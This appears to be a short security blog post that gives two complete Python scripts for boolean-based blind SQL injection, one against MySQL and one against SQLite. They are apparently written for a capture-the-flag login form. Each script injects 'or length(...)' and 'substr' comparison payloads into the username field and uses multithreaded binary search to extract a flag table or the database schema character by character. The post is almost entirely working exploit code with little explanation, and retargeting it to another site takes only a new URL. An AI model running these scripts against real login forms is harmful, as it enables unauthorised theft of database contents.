---
layout: post
title: "Boolean SQLi payload"
description: "Some simple implementation of SQLi payload"
categories: [web-security, sqli]
tags: [python, exploit-code]
redirect_from:
  - /2019/10/23/
---

These implementations using binary search with multiple thread.

# 1. MySQL
~~~ python
import requests
import concurrent.futures

URL =  "http://hack.bckdr.in:16013/submit.php"
DEBUG = False
MAX_LENGTH = 1024
MAX_THREAD = 50
TRUE_STRING = "Good to see you back"

def send_payload(payload):
    if DEBUG:
        print(payload)
    data = {
        "username": payload,
        "password": "payload"
    }
    while True:
        try:
            response = requests.get(URL, data)
            break
        except requests.exceptions.ConnectionError:
            print("Connection error, try again.")
            
    return TRUE_STRING in response.text

def search(query, min_value, max_value):
    while min_value < max_value:
        mid = (min_value + max_value) // 2
        payload = query % (mid)
        result = send_payload(payload)
        if result:
            max_value = mid
        else:
            min_value = mid + 1
    return max_value

def query_data(query, length):
    result = ['.'] * length
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREAD) as executor:
        futures_to_position = {}
        for i in range(1, length+1):
            current = query.format(i)
            f = executor.submit(search, current, 0, 255)
            futures_to_position[f] = i-1
            
        for future in concurrent.futures.as_completed(futures_to_position):
            pos = futures_to_position[future]
            c = future.result()
            result[pos] = chr(c)
            print("Processing:", ''.join(result), flush=True)

    return ''.join(result)

def retrive_data(query):
    sql_query_length = "' or length(({0})) <= %d -- -".format(query)
    sql_query_data = "' or ord(substr(({0}), {1}, 1)) <= %d -- -".format(query, "{0}")
    print("Searching data length...", end=' ', flush=True)
    length = search(sql_query_length, 0, MAX_LENGTH)
    print("Found length:", length, flush=True)
    print("Quering data...", flush=True)
    data = query_data(sql_query_data, length)

    return data

if __name__ == "__main__":
    data = retrive_data("select flag from its_in_here limit 1")
    print(data)
~~~

# 2. Sqlite3
~~~ python
import requests
import concurrent.futures
import signal

URL =  "http://hack.bckdr.in:16013/submit.php"
charset = '~!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
DEBUG = False
MAX_LENGTH = 1024
MAX_THREAD = 20
TRUE_STRING = "Good to see you back"

def send_payload(payload):
    if DEBUG:
        print(payload, end=' ')
    data = {
        "username": payload,
        "password": "payload"
    }
    
    response = requests.get(URL, data)

    result = TRUE_STRING in response.text
    if DEBUG:
        print(result)
    return result

def search_integer(query, min_value, max_value):
    while min_value < max_value:
        mid = (min_value + max_value) // 2
        payload = query % (mid)
        result = send_payload(payload)
        if result:
            max_value = mid
        else:
            min_value = mid + 1
    return max_value

def search_character(query):
    min_value = 0
    max_value = len(charset) - 1
    while min_value < max_value:
        mid = (min_value + max_value) // 2
        payload = query % (charset[mid])
        result = send_payload(payload)
        if result:
            max_value = mid
        else:
            min_value = mid + 1
    if max_value == 0:
        return ' '
    return charset[max_value]


def query_data(query, length):
    result = ['.'] * length
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREAD) as executor:
        futures_to_position = {}
        for i in range(1, length+1):
            current = query.format(i)
            f = executor.submit(search_character, current)
            futures_to_position[f] = i-1
            
        for future in concurrent.futures.as_completed(futures_to_position):
            pos = futures_to_position[future]
            c = future.result()
            result[pos] = c
            print("Processing:", ''.join(result), flush=True)

    return ''.join(result)

def retrive_data(query):
    sql_query_length = "' or length(({0})) <= %d -- -".format(query)
    sql_query_data = "' or substr(({0}), {1}, 1) <= '%s' -- -".format(query, "{0}")

    print("Searching data length...", end=' ', flush=True)
    length = search_integer(sql_query_length, 0, MAX_LENGTH)
    if length == MAX_LENGTH:
        print("Can't retrive data. Exiting...")
        exit(0)
        
    print("Found length:", length, flush=True)
    print("Quering data...", flush=True)
    data = query_data(sql_query_data, length)

    return data

def keyboardInterruptHandler(signal, frame):
    print("Force to exit")
    exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, keyboardInterruptHandler)

    data = retrive_data("SELECT sql FROM sqlite_master WHERE type='table' limit 1")
    print(data)
~~~